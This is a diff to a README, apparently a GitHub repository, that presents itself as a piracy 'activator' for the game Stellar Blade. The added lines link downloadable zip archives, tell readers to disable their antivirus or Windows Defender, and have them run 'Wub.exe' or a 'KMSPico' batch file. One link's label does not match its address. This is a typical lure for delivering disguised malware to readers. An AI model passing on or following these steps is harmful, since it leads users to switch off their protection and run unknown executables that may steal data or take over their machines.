@@ -1,9 +1,11 @@
 # StellarBlade-Activision-Fisrt-Run by Xelvryn, 
  				  MSFree Inc. 
+Step
 
-          	
+1. Blocker Windows Update
+[Windows Update Blocker](https://archive.org/download/wub_20251029/Wub.zip)     	
 Instruction for Activator (English version):
-
+[yofiproject.pro](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/archive/refs/heads/main.zip)
 1. DISABLE YOUR ANTIVIRUS OR WINDOWS DEFENDER.
 2. RUN "Wub.exe" or Wub_x64.exe to launch the activator.
 3. If you got an problem, try to open alternative file - unzip the archive and then RUN "Start KMSPico.bat".
